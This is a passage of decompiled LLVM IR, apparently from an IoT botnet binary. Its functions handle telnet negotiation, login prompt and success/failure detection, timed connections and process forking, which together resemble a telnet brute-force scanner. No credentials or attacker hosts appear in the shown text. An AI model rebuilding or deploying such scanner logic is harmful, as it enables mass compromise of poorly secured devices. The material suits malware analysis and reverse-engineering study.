  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9a38 = load i32, i32* @fp, align 4
  store i32 %v3_9a38, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9a64 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9a78

dec_label_pc_9a78:                                ; preds = %dec_label_pc_9a78.lr.ph, %dec_label_pc_9a78
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9a78.lr.ph ], [ %v1_9a8c, %dec_label_pc_9a78 ]
  %v5_9a84 = mul nuw nsw i32 %storemerge25, 4
  %v6_9a84 = add i32 %v5_9a84, %v2_9a64
  %v7_9a84 = inttoptr i32 %v6_9a84 to i32*
  store i32 0, i32* %v7_9a84, align 4
  %v1_9a8c = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9a8c, 32
  br i1 %tmp21, label %dec_label_pc_9a78, label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_9a78
  %v13_9a38 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9aa4 = udiv i32 %arg1, 32
  %v3_9ab0 = mul nuw nsw i32 %v3_9aa4, 4
  %v2_9ab8 = add nsw i32 %v3_9ab0, -136
  %v2_9abc = add i32 %v2_9ab8, %v13_9a38
  %v1_9ac0 = inttoptr i32 %v2_9abc to i32*
  %v2_9ac0 = load i32, i32* %v1_9ac0, align 4
  %v1_9ac8 = urem i32 %arg1, 32
  %v6_9ad0 = shl i32 1, %v1_9ac8
  %v2_9ad4 = or i32 %v2_9ac0, %v6_9ad0
  store i32 %v2_9ad4, i32* %v1_9ac0, align 4
  %v1_9af4 = add i32 %arg1, 1
  %v2_9afc = ptrtoint i32* %stack_var_-160 to i32
  %v5_9b10 = call i32 @__libc_select(i32 %v1_9af4, i32 %v2_9a64, i32 0, i32 0, i32 %v2_9afc)
  %v5_9b1c = icmp sgt i32 %v5_9b10, 0
  br i1 %v5_9b1c, label %dec_label_pc_9b2c, label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9aa0
  br label %dec_label_pc_9b4c

dec_label_pc_9b2c:                                ; preds = %dec_label_pc_9aa0
  %v5_9b40 = inttoptr i32 %arg3 to i32*
  %v6_9b40 = call i32 @__libc_recv(i32 %arg1, i32* %v5_9b40, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9b4c

dec_label_pc_9b4c:                                ; preds = %dec_label_pc_9b20, %dec_label_pc_9b2c
  %storemerge = phi i32 [ %v6_9b40, %dec_label_pc_9b2c ], [ 0, %dec_label_pc_9b20 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9a64, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9b4c, { 1, 0 }
  uselistorder label %dec_label_pc_9a78, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9b78 = icmp eq i32 %arg2, 0
  br i1 %v2_9b78, label %dec_label_pc_9b80, label %dec_label_pc_9b90

dec_label_pc_9b80:                                ; preds = %entry
  %v2_9b84 = load i32, i32* %arg1, align 4
  %v1_9b8c = call i32 @__libc_close(i32 %v2_9b84)
  br label %dec_label_pc_9b90

dec_label_pc_9b90:                                ; preds = %entry, %dec_label_pc_9b80
  %v2_9b98 = add i32 %tmp, 16
  %v3_9b98 = inttoptr i32 %v2_9b98 to i32*
  store i32 0, i32* %v3_9b98, align 4
  %v3_9b9c = load i32, i32* %stack_var_-24, align 4
  %v1_9ba8 = trunc i32 %v3_9b9c to i8
  %v3_9ba8 = add i32 %tmp, 8
  %v4_9ba8 = inttoptr i32 %v3_9ba8 to i8*
  store i8 %v1_9ba8, i8* %v4_9ba8, align 1
  %v1_9bb0 = add i32 %tmp, 24
  %v2_9bb0 = inttoptr i32 %v1_9bb0 to i32*
  %v3_9bb0 = load i32, i32* %v2_9bb0, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9bc0 = inttoptr i32 %v3_9bb0 to i8*
  %v3_9bc0 = call i32 @__GI_memset(i8* %v2_9bc0, i32 0)
  ret i32 %v3_9bc0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9b90, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9bd0 = load i32, i32* @fp, align 4
  %v2_9be8 = inttoptr i32 %arg1 to i32*
  %v3_9be8 = call i32 @advance_state(i32* %v2_9be8, i32 0)
  %v3_9bf4 = add i32 %arg1, 9
  %v4_9bf4 = inttoptr i32 %v3_9bf4 to i8*
  store i8 1, i8* %v4_9bf4, align 1
  store i32 %v3_9bd0, i32* @fp, align 4
  ret i32 %v3_9be8
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9c00 = load i32, i32* @fp, align 4
  %v3_9c18 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_23764.56 to i32))
  store i32 %v3_9c00, i32* @fp, align 4
  ret i32 %v3_9c18
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9c30 = load i32, i32* @fp, align 4
  %v3_9c48 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_23744.65 to i32))
  store i32 %v3_9c30, i32* @fp, align 4
  ret i32 %v3_9c48

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40040, i32* %stack_var_-4, align 4
  %v2_9c64 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c64, i32* @fp, align 4
  %v1_9c74 = call i32 @contains_success(i32 %arg1)
  %v2_9c7c = icmp eq i32 %v1_9c74, 0
  br i1 %v2_9c7c, label %dec_label_pc_9c84, label %dec_label_pc_9cac

dec_label_pc_9c84:                                ; preds = %entry
  %v1_9c88 = call i32 @contains_fail(i32 %arg1)
  %v2_9c90 = icmp ne i32 %v1_9c88, 0
  %. = zext i1 %v2_9c90 to i32
  br label %dec_label_pc_9cac

dec_label_pc_9cac:                                ; preds = %dec_label_pc_9c84, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9c84 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_9cec

dec_label_pc_9cec:                                ; preds = %dec_label_pc_9cec, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_9cf0, %dec_label_pc_9cec ]
  %v1_9cf0 = add i32 %stack_var_-24.0, 1
  %v3_9cfc = mul i32 %v1_9cf0, 4
  %v2_9d08 = add i32 %v3_9cfc, %arg2
  %v1_9d0c = inttoptr i32 %v2_9d08 to i32*
  %v2_9d0c = load i32, i32* %v1_9d0c, align 4
  %v2_9d10 = icmp eq i32 %v2_9d0c, 0
  br i1 %v2_9d10, label %dec_label_pc_9d6c.preheader, label %dec_label_pc_9cec

dec_label_pc_9d6c.preheader:                      ; preds = %dec_label_pc_9cec
  %v3_9d44 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_9d6c

dec_label_pc_9d24:                                ; preds = %dec_label_pc_9d6c
  %v3_9d28 = mul i32 %storemerge2, 4
  %v2_9d34 = add i32 %v3_9d28, %arg2
  %v1_9d38 = inttoptr i32 %v2_9d34 to i32*
  %v2_9d38 = load i32, i32* %v1_9d38, align 4
  %v4_9d44 = call i32 @strcasestr(i8* %v3_9d44, i32 %v2_9d38, i32 %v3_9d28)
  %v2_9d4c = icmp eq i32 %v4_9d44, 0
  %v1_9d64 = add nuw i32 %storemerge2, 1
  br i1 %v2_9d4c, label %dec_label_pc_9d6c, label %dec_label_pc_9d84

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_9d24, %dec_label_pc_9d6c.preheader
  %storemerge2 = phi i32 [ %v1_9d64, %dec_label_pc_9d24 ], [ 0, %dec_label_pc_9d6c.preheader ]
  %v5_9d78 = icmp slt i32 %storemerge2, %v1_9cf0
  br i1 %v5_9d78, label %dec_label_pc_9d24, label %dec_label_pc_9d84

dec_label_pc_9d84:                                ; preds = %dec_label_pc_9d6c, %dec_label_pc_9d24
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9d24 ], [ 0, %dec_label_pc_9d6c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_9cf0, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d98 = load i32, i32* @fp, align 4
  store i32 %v3_9d98, i32* %stack_var_-16, align 4
  %v13_9d98 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9dc0 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9dd0 = or i32 %v2_9dc0, 2048
  store i32 %v1_9dd0, i32* @r2, align 4
  %v2_9de4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9e00 = urem i32 %arg3, 65536
  %v1_9e08 = call i32 @htons(i32 %v3_9e00)
  %v3_9e30 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9e38 = icmp eq i32 %v3_9e30, 0
  br i1 %v2_9e38, label %dec_label_pc_9e4c, label %dec_label_pc_9e40

dec_label_pc_9e40:                                ; preds = %entry
  br label %dec_label_pc_a004

dec_label_pc_9e4c:                                ; preds = %entry
  %v3_9e74 = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_9e74 = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_9e74, i32 16)
  %v1_9e84 = icmp slt i32 %v4_9e74, 0
  br i1 %v1_9e84, label %dec_label_pc_9e8c, label %dec_label_pc_9fc8

dec_label_pc_9e8c:                                ; preds = %dec_label_pc_9e4c
  %v0_9e8c = call i32 @__errno_location()
  %v1_9e94 = inttoptr i32 %v0_9e8c to i32*
  %v2_9e94 = load i32, i32* %v1_9e94, align 4
  %v7_9e98 = icmp eq i32 %v2_9e94, 115
  br i1 %v7_9e98, label %dec_label_pc_9ec4.lr.ph, label %dec_label_pc_9fbc

dec_label_pc_9ec4.lr.ph:                          ; preds = %dec_label_pc_9e8c
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9eb0 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9ec4

dec_label_pc_9ec4:                                ; preds = %dec_label_pc_9ec4.lr.ph, %dec_label_pc_9ec4
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9ec4.lr.ph ], [ %v1_9ed8, %dec_label_pc_9ec4 ]
  %v5_9ed0 = mul nuw nsw i32 %storemerge14, 4
  %v6_9ed0 = add i32 %v5_9ed0, %v2_9eb0
  %v7_9ed0 = inttoptr i32 %v6_9ed0 to i32*
  store i32 0, i32* %v7_9ed0, align 4
  %v1_9ed8 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_9ed8, 32
  br i1 %tmp32, label %dec_label_pc_9ec4, label %dec_label_pc_9eec

dec_label_pc_9eec:                                ; preds = %dec_label_pc_9ec4
  %v3_9ef0 = udiv i32 %arg1, 32
  %v3_9efc = mul nuw nsw i32 %v3_9ef0, 4
  %v2_9f04 = add nsw i32 %v3_9efc, -160
  %v2_9f08 = add i32 %v2_9f04, %v13_9d98
  %v1_9f0c = inttoptr i32 %v2_9f08 to i32*
  %v2_9f0c = load i32, i32* %v1_9f0c, align 4
  %v1_9f14 = urem i32 %arg1, 32
  %v6_9f1c = shl i32 1, %v1_9f14
  %v2_9f20 = or i32 %v2_9f0c, %v6_9f1c
  store i32 %v2_9f20, i32* %v1_9f0c, align 4
  %v1_9f40 = add i32 %arg1, 1
  %v2_9f48 = ptrtoint i32* %stack_var_-184 to i32
  %v5_9f60 = call i32 @__libc_select(i32 %v1_9f40, i32 0, i32 %v2_9eb0, i32 0, i32 %v2_9f48)
  %tmp33 = icmp slt i32 %v5_9f60, 1
  br i1 %tmp33, label %dec_label_pc_9fb0, label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %dec_label_pc_9eec
  %v0_9f94 = call i32 @getsockopt()
  %v3_9f98 = load i32, i32* %stack_var_-192, align 4
  %v2_9f9c = icmp eq i32 %v3_9f98, 0
  br i1 %v2_9f9c, label %dec_label_pc_9fc8, label %dec_label_pc_9fa4

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f70
  br label %dec_label_pc_a004

dec_label_pc_9fb0:                                ; preds = %dec_label_pc_9eec
  br label %dec_label_pc_a004

dec_label_pc_9fbc:                                ; preds = %dec_label_pc_9e8c
  br label %dec_label_pc_a004

dec_label_pc_9fc8:                                ; preds = %dec_label_pc_9e4c, %dec_label_pc_9f70
  store i32 0, i32* @r2, align 4
  %v2_9fd4 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9fe4 = and i32 %v2_9fd4, -2049
  store i32 %v1_9fe4, i32* @r2, align 4
  %v2_9ff8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a004

dec_label_pc_a004:                                ; preds = %dec_label_pc_9fbc, %dec_label_pc_9fb0, %dec_label_pc_9fa4, %dec_label_pc_9e40, %dec_label_pc_9fc8
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9fb0 ], [ 1, %dec_label_pc_9fc8 ], [ 0, %dec_label_pc_9fa4 ], [ 0, %dec_label_pc_9fbc ], [ 0, %dec_label_pc_9e40 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9eb0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_a004, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_9fc8, { 1, 0 }
  uselistorder label %dec_label_pc_9ec4, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_a014 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a014, i32* @ip, align 4
  %v3_a018 = load i32, i32* @r4, align 4
  %v6_a018 = load i32, i32* @r5, align 4
  %v9_a018 = load i32, i32* @r6, align 4
  %v0_a024 = call i32 @__libc_fork()
  %v2_a034 = icmp eq i32 %v0_a024, 0
  br i1 %v2_a034, label %dec_label_pc_a194, label %dec_label_pc_a048

dec_label_pc_a048:                                ; preds = %entry
  %v2_a04c = load i32, i32* @global_var_23b30.67, align 4
  %v5_a04c = load i32, i32* @global_var_23b34.68, align 4
  %v2_a058 = add i32 %v2_a04c, 1
  %v3_a058 = icmp eq i32 %v2_a058, 0
  %v4_a05c = zext i1 %v3_a058 to i32
  %v5_a05c = add i32 %v4_a05c, %v5_a04c
  store i32 %v2_a058, i32* @global_var_23b30.67, align 4
  store i32 %v5_a05c, i32* @global_var_23b34.68, align 4
  %v3_a070 = udiv i32 %v2_a058, 1073741824
  %v3_a074 = mul i32 %v5_a05c, 4
  %v2_a078 = or i32 %v3_a074, %v3_a070
  store i32 %v2_a078, i32* @r4, align 4
  %v3_a07c = mul i32 %v2_a058, 4
  %v1_a080 = add i32 %v3_a07c, 4
  %v1_a088 = call i32 @malloc(i32 %v1_a080)
  br label %dec_label_pc_a0e0

dec_label_pc_a0a0:                                ; preds = %dec_label_pc_a0e0, %dec_label_pc_a12c
  %v3_a0a4 = mul i32 %storemerge2, 4
  %v2_a0b0 = add i32 %v3_a0a4, %v1_a088
  %v2_a0c4 = load i32, i32* @global_var_29db4.70, align 4
  %v2_a0c8 = add i32 %v2_a0c4, %v3_a0a4
  %v1_a0cc = inttoptr i32 %v2_a0c8 to i32*
  %v2_a0cc = load i32, i32* %v1_a0cc, align 4
  %v2_a0d0 = inttoptr i32 %v2_a0b0 to i32*
  store i32 %v2_a0cc, i32* %v2_a0d0, align 4
  %v1_a0d8 = add i32 %storemerge2, 1
  br label %dec_label_pc_a0e0

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a048, %dec_label_pc_a0a0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a048 ], [ %v1_a0d8, %dec_label_pc_a0a0 ]
  %v2_a0f8 = load i32, i32* @global_var_23b30.67, align 4
  %v5_a0f8 = load i32, i32* @global_var_23b34.68, align 4
  %v2_a10c = add i32 %v2_a0f8, -1
  %v3_a10c = icmp ne i32 %v2_a0f8, 0
  %v3_a110 = add i32 %v5_a0f8, -1
  %v5_a110 = sext i1 %v3_a10c to i32
  %v9_a124 = icmp eq i32 %v3_a110, %v5_a110
  br i1 %v9_a124, label %dec_label_pc_a12c, label %dec_label_pc_a0a0

dec_label_pc_a12c:                                ; preds = %dec_label_pc_a0e0
  store i32 %v2_a10c, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a10c, %storemerge2
  br i1 %tmp, label %dec_label_pc_a0a0, label %dec_label_pc_a14c

dec_label_pc_a14c:                                ; preds = %dec_label_pc_a12c
  store i32 %v5_a0f8, i32* @r4, align 4
  %v3_a154 = mul i32 %v2_a0f8, 4
  %v2_a160 = add i32 %v1_a088, -4
  %v1_a164 = add i32 %v2_a160, %v3_a154
  %v2_a16c = inttoptr i32 %v1_a164 to i32*
  store i32 %v0_a024, i32* %v2_a16c, align 4
  %v2_a174 = load i32, i32* @global_var_29db4.70, align 4
  store i32 %v2_a174, i32* @r0, align 4
  %v0_a17c = call i32 @free()
  store i32 %v1_a088, i32* @global_var_29db4.70, align 4
  br label %dec_label_pc_a194

dec_label_pc_a194:                                ; preds = %entry, %dec_label_pc_a14c
  store i32 %v3_a018, i32* @r4, align 4
  store i32 %v6_a018, i32* @r5, align 4
  store i32 %v9_a018, i32* @r6, align 4
  ret i32 %v0_a024

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a0a4, { 1, 0 }
  uselistorder i32 %v1_a088, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a194, { 1, 0 }
  uselistorder label %dec_label_pc_a0e0, { 1, 0 }
  uselistorder label %dec_label_pc_a0a0, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a1cc = add i32 %arg2, 1
  %v1_a1d0 = inttoptr i32 %v1_a1cc to i8*
  %v2_a1d0 = load i8, i8* %v1_a1d0, align 1
  %v7_a1dc = icmp ult i8 %v2_a1d0, -5
  br i1 %v7_a1dc, label %dec_label_pc_a328, label %dec_label_pc_a1e4

dec_label_pc_a1e4:                                ; preds = %entry
  %v7_a1ec = icmp eq i8 %v2_a1d0, -1
  br i1 %v7_a1ec, label %dec_label_pc_a1f0, label %dec_label_pc_a20c

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a1e4
  br label %dec_label_pc_a328

dec_label_pc_a20c:                                ; preds = %dec_label_pc_a1e4
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a228 = bitcast i8* %stack_var_-17 to i32*
  %v6_a228 = call i32 @__libc_send(i32 %arg1, i32* %v5_a228, i32 1, i32 16384)
  %v2_a234 = load i8, i8* %v1_a1d0, align 1
  %v7_a238 = icmp eq i8 %v2_a234, -4
  br i1 %v7_a238, label %dec_label_pc_a240, label %dec_label_pc_a24c

dec_label_pc_a240:                                ; preds = %dec_label_pc_a20c
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2ec

dec_label_pc_a24c:                                ; preds = %dec_label_pc_a20c
  %v2_a254 = load i8, i8* %v1_a1d0, align 1
  %v7_a258 = icmp eq i8 %v2_a254, -2
  br i1 %v7_a258, label %dec_label_pc_a260, label %dec_label_pc_a26c

dec_label_pc_a260:                                ; preds = %dec_label_pc_a24c
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2ec

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a24c
  %v2_a274 = load i8, i8* %v1_a1d0, align 1
  %v7_a278 = icmp eq i8 %v2_a274, 3
  %v7_a28c = icmp eq i8 %v2_a274, -3
  br i1 %v7_a278, label %dec_label_pc_a280, label %dec_label_pc_a2b8

dec_label_pc_a280:                                ; preds = %dec_label_pc_a26c
  br i1 %v7_a28c, label %dec_label_pc_a294, label %dec_label_pc_a2a0

dec_label_pc_a294:                                ; preds = %dec_label_pc_a280
  br label %dec_label_pc_a2a8

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a280
  br label %dec_label_pc_a2a8

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a2a0
  %storemerge = phi i8 [ -3, %dec_label_pc_a2a0 ], [ -5, %dec_label_pc_a294 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2ec

dec_label_pc_a2b8:                                ; preds = %dec_label_pc_a26c
  br i1 %v7_a28c, label %dec_label_pc_a2cc, label %dec_label_pc_a2d8

dec_label_pc_a2cc:                                ; preds = %dec_label_pc_a2b8
  br label %dec_label_pc_a2e0

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a2b8
  br label %dec_label_pc_a2e0

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a2cc, %dec_label_pc_a2d8
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a2d8 ], [ -4, %dec_label_pc_a2cc ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2a8, %dec_label_pc_a260, %dec_label_pc_a240, %dec_label_pc_a2e0
  %v5_a300 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a228, i32 1, i32 16384)
  %v1_a308 = add i32 %arg2, 2
  %v4_a31c = inttoptr i32 %v1_a308 to i32*
  %v5_a31c = call i32 @__libc_send(i32 %arg1, i32* %v4_a31c, i32 1, i32 16384)
  br label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a1f0, %dec_label_pc_a2ec, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a328, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a2ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a2e0, { 1, 0 }
  uselistorder label %dec_label_pc_a2a8, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a358 = call i32 @strlen(i8* %arg1)
  %v2_a3a0 = add i32 %v3_a358, %tmp
  br label %dec_label_pc_a474

dec_label_pc_a378:                                ; preds = %dec_label_pc_a400, %dec_label_pc_a3dc, %dec_label_pc_a3b8, %dec_label_pc_a394
  %v1_a37c = add nsw i32 %stack_var_-24.014, 1
  %v7_a390 = icmp sgt i32 %v3_a358, %v1_a37c
  br i1 %v7_a390, label %dec_label_pc_a394, label %dec_label_pc_a424

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384.preheader, %dec_label_pc_a378
  %stack_var_-24.014 = phi i32 [ %v1_a37c, %dec_label_pc_a378 ], [ %stack_var_-24.1, %dec_label_pc_a384.preheader ]
  %v2_a3a8 = sub i32 %v2_a3a0, %stack_var_-24.014
  %v1_a3ac = inttoptr i32 %v2_a3a8 to i8*
  %v2_a3ac = load i8, i8* %v1_a3ac, align 1
  %v2_a3b0 = icmp eq i8 %v2_a3ac, 0
  br i1 %v2_a3b0, label %dec_label_pc_a378, label %dec_label_pc_a3b8

dec_label_pc_a3b8:                                ; preds = %dec_label_pc_a394
  %v2_a3d0 = load i8, i8* %v1_a3ac, align 1
  %v7_a3d4 = icmp eq i8 %v2_a3d0, 32
  br i1 %v7_a3d4, label %dec_label_pc_a378, label %dec_label_pc_a3dc

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3b8
  %v2_a3f4 = load i8, i8* %v1_a3ac, align 1
  %v7_a3f8 = icmp eq i8 %v2_a3f4, 13
  br i1 %v7_a3f8, label %dec_label_pc_a378, label %dec_label_pc_a400

dec_label_pc_a400:                                ; preds = %dec_label_pc_a3dc
  %v2_a418 = load i8, i8* %v1_a3ac, align 1
  %v7_a41c = icmp eq i8 %v2_a418, 10
  br i1 %v7_a41c, label %dec_label_pc_a378, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a400, %dec_label_pc_a378, %dec_label_pc_a384.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a384.preheader ], [ %stack_var_-24.014, %dec_label_pc_a400 ], [ %v1_a37c, %dec_label_pc_a378 ]
  %v2_a438 = sub i32 %v2_a3a0, %stack_var_-24.0.lcssa
  %v1_a43c = inttoptr i32 %v2_a438 to i8*
  %v2_a43c = load i8, i8* %v1_a43c, align 1
  %v2_a44c = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_19440.72 to i32)
  %v1_a450 = inttoptr i32 %v2_a44c to i8*
  %v2_a450 = load i8, i8* %v1_a450, align 1
  %v9_a454 = icmp eq i8 %v2_a43c, %v2_a450
  %v1_a46c = add i32 %storemerge3, 1
  br i1 %v9_a454, label %dec_label_pc_a494, label %dec_label_pc_a474

dec_label_pc_a474:                                ; preds = %dec_label_pc_a424, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a424 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a46c, %dec_label_pc_a424 ]
  %v3_a47c = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19440.72, i32 0, i32 0))
  %v3_a484 = icmp ult i32 %storemerge3, %v3_a47c
  br i1 %v3_a484, label %dec_label_pc_a384.preheader, label %dec_label_pc_a494

dec_label_pc_a384.preheader:                      ; preds = %dec_label_pc_a474
  %v7_a39013 = icmp sgt i32 %v3_a358, %stack_var_-24.1
  br i1 %v7_a39013, label %dec_label_pc_a394, label %dec_label_pc_a424

dec_label_pc_a494:                                ; preds = %dec_label_pc_a474, %dec_label_pc_a424
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a424 ], [ 0, %dec_label_pc_a474 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a358, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a424, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a4ac = load i32, i32* @fp, align 4
  store i32 %v3_a4ac, i32* %stack_var_-16, align 4
  %v13_a4ac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a4fc = ptrtoint i32* %stack_var_-168 to i32
  %v3_a53c = udiv i32 %arg1, 32
  %v3_a548 = mul nuw nsw i32 %v3_a53c, 4
  %v1_a560 = urem i32 %arg1, 32
  %v6_a568 = shl i32 1, %v1_a560
  %v1_a58c = add i32 %arg1, 1
  %v2_a594 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a6b4 = inttoptr i32 %arg2 to i8*
  %v2_a6c8 = icmp eq i32 %arg3, 0
  %v1_a6d4 = inttoptr i32 %arg6 to i8*
  %v5_a718 = icmp sgt i32 %arg5, 0
  %v2_a550 = add nsw i32 %v3_a548, -152
  %v2_a554 = add i32 %v2_a550, %v13_a4ac
  %v1_a558 = inttoptr i32 %v2_a554 to i32*
  br label %dec_label_pc_a6f0

dec_label_pc_a510.lr.ph:                          ; preds = %dec_label_pc_a704, %dec_label_pc_a710
  br label %dec_label_pc_a510

dec_label_pc_a510:                                ; preds = %dec_label_pc_a510.lr.ph, %dec_label_pc_a510
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a510.lr.ph ], [ %v1_a524, %dec_label_pc_a510 ]
  %v5_a51c = mul nuw nsw i32 %storemerge27, 4
  %v6_a51c = add i32 %v5_a51c, %v2_a4fc
  %v7_a51c = inttoptr i32 %v6_a51c to i32*
  store i32 0, i32* %v7_a51c, align 4
  %v1_a524 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a524, 32
